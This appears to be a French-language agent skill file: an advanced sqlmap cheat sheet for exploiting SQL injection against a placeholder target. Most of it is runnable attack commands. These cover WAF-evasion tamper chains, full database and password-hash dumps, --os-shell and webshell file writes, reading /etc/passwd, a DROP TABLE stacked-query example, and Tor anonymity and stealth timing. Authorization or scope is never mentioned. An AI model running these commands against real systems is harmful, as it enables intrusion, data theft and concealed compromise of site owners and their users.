---
name: sqlmap-avance
description: sqlmap avancé — détection et exploitation d'injections SQL, tamper scripts (contournement WAF), OS shell, lecture/écriture fichiers, privilèges, automatisation, techniques d'évasion, et scénarios complets.
---

# sqlmap Avancé — Guide Complet

## Présentation

sqlmap est l'outil open-source d'exploitation d'injection SQL le plus avancé. Il automatise la détection, l'exploitation et le post-exploitation SQLi.

**Installation :**
```bash
sudo apt install sqlmap
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev && python3 sqlmap.py
```

---

## Détection et reconnaissance

### Tests basiques
```bash
# URL avec paramètre GET
sqlmap -u "http://cible.com/page.php?id=1"

# POST request
sqlmap -u "http://cible.com/login.php" --data="user=admin&pass=123"

# Depuis un fichier de requête (Burp/ZAP)
sqlmap -r /path/to/request.txt

# Avec cookie de session
sqlmap -u "http://cible.com/dashboard.php?id=1" --cookie="PHPSESSID=abc123"

# Avec headers personnalisés
sqlmap -u "http://cible.com/api" --headers="X-API-Key: 123\nAuthorization: Bearer token"
```

### Détection du type de SGBD
```bash
# Fingerprint
sqlmap -u "http://cible.com/page.php?id=1" --fingerprint

# Forcer un SGBD spécifique
sqlmap -u "http://cible.com/page.php?id=1" --dbms=mysql
sqlmap -u "http://cible.com/page.php?id=1" --dbms=mssql
sqlmap -u "http://cible.com/page.php?id=1" --dbms=postgresql
sqlmap -u "http://cible.com/page.php?id=1" --dbms=oracle
```

### Niveau et risque
```bash
# Level 1-5 : profondeur des tests (1=basique, 5=exhaustif)
sqlmap -u "..." --level=5

# Risk 1-3 : impact des tests (3 peut modifier la DB)
sqlmap -u "..." --risk=3
sqlmap -u "..." --level=5 --risk=3

# Recommandation : commencer low, monter progressivement
sqlmap -u "..." --level=1 --risk=1   # Rapide, peu intrusif
sqlmap -u "..." --level=3 --risk=2   # Équilibré
sqlmap -u "..." --level=5 --risk=3   # Lent, exhaustif
```

---

## Techniques d'injection

### Types d'injection
```bash
# Spécifier la technique
sqlmap -u "..." --technique=B    # Boolean-based blind
sqlmap -u "..." --technique=U    # Union query
sqlmap -u "..." --technique=E    # Error-based
sqlmap -u "..." --technique=T    # Time-based blind
sqlmap -u "..." --technique=S    # Stacked queries
sqlmap -u "..." --technique=Q    # Inline queries

# Multiple techniques
sqlmap -u "..." --technique=BE     # Boolean + Error
sqlmap -u "..." --technique=BEUSTQ # Toutes
```

### Boolean-based blind (par défaut)
```bash
sqlmap -u "http://cible.com/page.php?id=1" --technique=B
# Compare les réponses vraies/fausses
# ?id=1 AND 1=1 (vrai) vs ?id=1 AND 1=2 (faux)
```

### Error-based
```bash
sqlmap -u "http://cible.com/page.php?id=1" --technique=E
# Exploite les messages d'erreur SQL pour extraire des données
# MySQL : extractvalue(), updatexml()
# PostgreSQL : cast()
# MSSQL : convert()
```

### Union query
```bash
sqlmap -u "http://cible.com/page.php?id=1" --technique=U
# Utilise UNION SELECT pour afficher les données directement
# Nécessite le même nombre de colonnes
```

### Time-based blind
```bash
sqlmap -u "http://cible.com/page.php?id=1" --technique=T
# Plus lent mais très furtif (aucune différence visible)
# ?id=1 AND IF(SUBSTRING(@@version,1,1)=5,SLEEP(5),0)
# Ajuster le timeout
sqlmap -u "..." --technique=T --time-sec=1   # SLEEP 1 seconde (furtif)
sqlmap -u "..." --technique=T --time-sec=10  # SLEEP 10 seconde (moins de requêtes)
```

### Stacked queries
```bash
sqlmap -u "http://cible.com/page.php?id=1" --technique=S
# Permet d'exécuter des requêtes multiples
# ?id=1; DROP TABLE users--
# Utile pour : time-based, shell, filesystem
```

---

## Détection de paramètres

### POST / JSON / XML
```bash
# Paramètre POST spécifique
sqlmap -u "http://cible.com/login.php" \
    --data="username=admin&password=test&csrf=token123" \
    -p username   # Tester UN paramètre

# Tous les paramètres
sqlmap -u "..." --data="..." --level=5

# JSON
sqlmap -u "http://cible.com/api/login" \
    --data='{"username":"admin","password":"test"}' \
    --data-format=json

# XML
sqlmap -u "http://cible.com/api/login" \
    --data='<login><user>admin</user><pass>test</pass></login>" \
    --data-format=xml
```

### Header-based injection
```bash
# Cookie
sqlmap -u "http://cible.com/dashboard.php" --cookie="id=1"
sqlmap -u "http://cible.com/dashboard.php" --cookie="session=abc123; id=1"

# User-Agent
sqlmap -u "http://cible.com/" --level=3 --user-agent="Mozilla/5.0..."

# Referer
sqlmap -u "http://cible.com/" --level=3 --headers="Referer: http://cible.com/admin"

# X-Forwarded-For
sqlmap -u "http://cible.com/" --level=3 --headers="X-Forwarded-For: 1*"
```

### Second-order injection
```bash
# L'injection est stockée puis exécutée ailleurs
sqlmap -u "http://cible.com/register" --data="user=admin&pass=test" \
    --second-order="http://cible.com/profile.php"
```

---

## Tamper scripts (contournement WAF)

```bash
# Lister les tampers
sqlmap --list-tampers

# Les tampers les plus utiles :
# Bypass WAF générique
sqlmap -u "..." --tamper=between,randomcase,space2comment
sqlmap -u "..." --tamper=between,charencode,space2comment

# Contre WAF spécifiques
sqlmap -u "..." --tamper=modsecurityversioned   # ModSecurity
sqlmap -u "..." --tamper=cloudflare             # CloudFlare
sqlmap -u "..." --tamper=modsecurityzeroversioned # ModSecurity 0
sqlmap -u "..." --tamper=safedog               # SafeDog
sqlmap -u "..." --tamper=360safe               # 360 Safe

# Contournement spécifiques
sqlmap -u "..." --tamper=space2mysqlblank      # MySQL (espaces → tabs)
sqlmap -u "..." --tamper=space2dash             # Dash comment
sqlmap -u "..." --tamper=space2hash             # Hash comment
sqlmap -u "..." --tamper=apostrophemask         # Apostrophe → UTF-8
sqlmap -u "..." --tamper=bluecoat               # BlueCoat proxy
sqlmap -u "..." --tamper=halfversionedmorekeywords  # MySQL versioned
sqlmap -u "..." --tamper=equaltolike            # = → LIKE
sqlmap -u "..." --tamper=greatest               # > → GREATEST
sqlmap -u "..." --tamper=ifnull2casewhenisnull  # IFNULL → CASE

# Combinaison agressive
sqlmap -u "..." --tamper="apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2casewhenisnull,modsecurityversioned,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes"

# Ajouter un délai entre requêtes pour rester furtif
sqlmap -u "..." --tamper=between --delay=2
```

---

## Enumération de la base

### Bases de données
```bash
# Lister les bases de données
sqlmap -u "http://cible.com/page.php?id=1" --dbs

# Base courante
sqlmap -u "..." --current-db

# Utilisateur courant
sqlmap -u "..." --current-user

# Version du SGBD
sqlmap -u "..." --banner
sqlmap -u "..." --hostname
```

### Tables
```bash
# Lister les tables d'une base
sqlmap -u "..." -D nom_base --tables

# Exclure les tables système
sqlmap -u "..." --exclude-sysdbs --tables

# Compter les tables
sqlmap -u "..." -D nom_base --count
```

### Colonnes
```bash
# Lister les colonnes d'une table
sqlmap -u "..." -D nom_base -T users --columns

# Rechercher des colonnes spécifiques
sqlmap -u "..." --search -C password,email,username,admin
sqlmap -u "..." --search -T users,admin,login,secret
```

### Données
```bash
# Dump complet d'une table
sqlmap -u "..." -D nom_base -T users --dump

# Dump conditionnel (WHERE)
sqlmap -u "..." -D nom_base -T users --dump --where="role='admin'"

# Dump partiel (limite)
sqlmap -u "..." -D nom_base -T users --dump --start=1 --stop=50

# Dump des champs spécifiques
sqlmap -u "..." -D nom_base -T users --dump -C username,password,email
```

### Schéma complet
```bash
# Dumper toute la base
sqlmap -u "..." -D nom_base --dump-all

# Dump toutes les bases non système
sqlmap -u "..." --dump-all --exclude-sysdbs
```

---

## Élévation de privilèges

```bash
# Utilisateur courant et privilèges
sqlmap -u "..." --current-user
sqlmap -u "..." --is-dba          # L'utilisateur est-il DBA ?

# Lister les utilisateurs
sqlmap -u "..." --users
sqlmap -u "..." --privileges      # Tous
sqlmap -u "..." --privileges -U admin  # Utilisateur spécifique

# Lister les rôles
sqlmap -u "..." --roles

# Hash des mots de passe
sqlmap -u "..." --passwords
sqlmap -u "..." --passwords -U sa  # MSSQL SA password
```

---

## OS Shell (RCE)

### Condition : être DBA ou SUPER PRIVILEGE

```bash
# Obtenir un shell OS
sqlmap -u "http://cible.com/page.php?id=1" --os-shell

# Choix du langage pour le webshell
# 1. ASP (Windows)
# 2. ASPX (Windows .NET)
# 3. JSP (Java)
# 4. PHP (Linux, le plus courant)

# Obtenir un shell SQL (via stacked queries)
sqlmap -u "..." --sql-shell

# Exécution de commande directe
sqlmap -u "..." --os-cmd="whoami"
sqlmap -u "..." --os-cmd="cat /etc/passwd"

# Attention : --os-shell crée des fichiers webshell
# Retrouver le chemin : 
#   /tmp/  ou  /var/www/html/  pour Linux
#   C:\Windows\Temp\  pour Windows
```

### UDF (User Defined Function) — MySQL
```bash
# Créer et exécuter une UDF
sqlmap -u "..." --udf-inject
# Permet d'exécuter des commandes système via UDF
# Nécessite plugin_dir accessible en écriture
```

---

## Lecture et écriture de fichiers

```bash
# Condition : FILE privilege (GRANT FILE ON *.* TO user)

# Lire un fichier
sqlmap -u "http://cible.com/page.php?id=1" --file-read=/etc/passwd
sqlmap -u "..." --file-read="C:/Users/Administrator/Desktop/flag.txt"

# Écrire un fichier
sqlmap -u "..." --file-write=/local/payload.php \
    --file-dest=/var/www/html/shell.php

# Les fichiers sont sauvegardés dans ~/.local/share/sqlmap/output/
```

---

## Requêtes avancées

### Requêtes personnalisées
```bash
# Requête SQL personnalisée
sqlmap -u "..." --sql-query="SELECT @@version"
sqlmap -u "..." --sql-query="SELECT name FROM master..sysdatabases"  # MSSQL
sqlmap -u "..." --sql-query="SELECT * FROM mysql.user LIMIT 1"      # MySQL
```

### Énumération avancée
```bash
# Schéma complet d'une base
sqlmap -u "..." --schema

# Statistiques
sqlmap -u "..." --statements     # Requêtes en cours (MSSQL)
sqlmap -u "..." --count          # Nombre d'entrées

# Recherche dans toute la base
sqlmap -u "..." --search -C password,secret,key,token
```

---

## Réseau et proxy

### Contournement de restrictions réseau
```bash
# Proxy HTTP
sqlmap -u "..." --proxy="http://127.0.0.1:8080"
sqlmap -u "..." --proxy="http://192.168.1.1:3128"

# Proxy SOCKS
sqlmap -u "..." --proxy="socks5://127.0.0.1:1080"

# Tor (anonymisation)
sqlmap -u "..." --tor --tor-type=SOCKS5 --check-tor

# Random Agent
sqlmap -u "..." --random-agent
sqlmap -u "..." --user-agent="Mozilla/5.0..."  # Custom

# Throttle (limiter débit)
sqlmap -u "..." --delay=2        # 2 secondes entre requêtes
sqlmap -u "..." --safe-freq=10   # Requête safe toutes les 10 req.
```

### Format d'URL
```bash
# GET
sqlmap -u "http://cible.com/page?id=1&cat=2"

# RESTful
sqlmap -u "http://cible.com/api/user/1*"    # * = injection point
sqlmap -u "http://cible.com/api/user/*"

# POST JSON
sqlmap -u "http://cible.com/api/login" \
    --data='{"username":"admin*","password":"test"}'
```

---

## Sortie et rapport

```bash
# Format de sortie
sqlmap -u "..." --output-dir=/tmp/sqlmap_results
sqlmap -u "..." -t /tmp/sqlmap.log          # Trace log
sqlmap -u "..." -v 6                         # Verbose max (débogage)

# Niveaux de verbose
-v 0  # Silencieux
-v 1  # Info basique (défaut)
-v 2  # Détails
-v 3  +  Payloads
-v 4  +  Requêtes HTTP
-v 5  +  Réponses HTTP
-v 6  +  Headers

# Session persistante (ne pas re-scanner)
sqlmap -u "..." --flush-session   # Effacer session
sqlmap -u "..." --no-cast         # Ne pas utiliser CAST()
sqlmap -u "..." --fresh-queries   # Ignorer le cache
```

---

## Batch et non-interactif

```bash
# Mode batch (pas de questions)
sqlmap -u "http://cible.com/page.php?id=1" --batch

# Dump automatique complet
sqlmap -u "http://cible.com/page.php?id=1" \
    --batch --dump-all --exclude-sysdbs --output-dir=./results

# Script complet automatisé
sqlmap -u "http://cible.com/page.php?id=1" \
    --batch \
    --level=3 \
    --risk=2 \
    --random-agent \
    --tamper=between \
    --dbs \
    --dump-all \
    --exclude-sysdbs \
    --output-dir=./sqlmap_results
```

---

## Scénarios complets

### 1. Injection SQL complète vers RCE (MySQL)
```bash
# Étape 1 : Détection
sqlmap -u "http://cible.com/page.php?id=1" --batch

# Étape 2 : Fingerprint
sqlmap -u "http://cible.com/page.php?id=1" --fingerprint --batch

# Étape 3 : Enumération de base
sqlmap -u "http://cible.com/page.php?id=1" --dbs --batch

# Étape 4 : Dump de la table users
sqlmap -u "http://cible.com/page.php?id=1" -D app_db -T users --dump --batch

# Étape 5 : Vérifier si DBA
sqlmap -u "http://cible.com/page.php?id=1" --is-dba --batch

# Étape 6 : OS Shell
sqlmap -u "http://cible.com/page.php?id=1" --os-shell --batch
```

### 2. Injection POST avec Cookie + WAF
```bash
# Capture Burp → r/injection_request.txt
POST /login.php HTTP/1.1
Host: cible.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

user=admin&pass=123

# Lancer sqlmap
sqlmap -r injection_request.txt \
    --level=5 \
    --risk=3 \
    --tamper="between,randomcase,space2comment" \
    --random-agent \
    --delay=1 \
    --batch
```

### 3. Injection Time-based furtive
```bash
sqlmap -u "http://cible.com/page.php?id=1" \
    --technique=T \
    --time-sec=1 \
    --random-agent \
    --proxy="http://127.0.0.1:8080" \
    --delay=3 \
    --tor \
    --check-tor \
    --batch
```

### 4. API JSON injection
```bash
sqlmap -u "http://cible.com/api/search" \
    --data='{"search":"test*","limit":10}' \
    --data-format=json \
    --headers="Authorization: Bearer eyJhbGci..." \
    --level=3 \
    --batch
```

### 5. Second-order + Stored XSS via SQLi
```bash
# Injection dans le register
sqlmap -u "http://cible.com/register" \
    --data="user=admin&email=test@test.com&pass=test" \
    --second-order="http://cible.com/profile.php" \
    --batch
```

---

## Dépannage

| Problème | Solution |
|----------|----------|
| Détection trop longue | Réduire level/risk, spécifier technique |
| Faux négatif | Ajouter --level=5 --risk=3 |
| Faux positif | Vérifier manuellement dans Repeater |
| WAF bloque | Ajouter --random-agent + tamper scripts |
| Timeout | --time-sec=1, --delay=0 |
| "No parameter found" | Marquer avec * dans l'URL |
| Erreur SSL | --force-ssl ou changer en http |
| Cookie expire | --cookie + --drop-set-cookie |

---

## Antisèche rapide

```bash
# Test rapide
sqlmap -u "http://cible.com/page.php?id=1" --batch

# Enumération complète
sqlmap -u "..." --dbs --dump-all --batch

# WAF bypass
sqlmap -u "..." --tamper=between,randomcase,space2comment

# OS Shell
sqlmap -u "..." --os-shell

# Time-based furtif
sqlmap -u "..." --technique=T --time-sec=1 --delay=2

# POST request
sqlmap -u "..." --data="user=admin&pass=test" -p user

# Burp request file
sqlmap -r request.txt --batch

# Dump users table
sqlmap -u "..." -D app -T users --dump

# Current DB + user
sqlmap -u "..." --current-db --current-user

# JSON API
sqlmap -u "..." --data='{"key":"val*"}' --data-format=json
```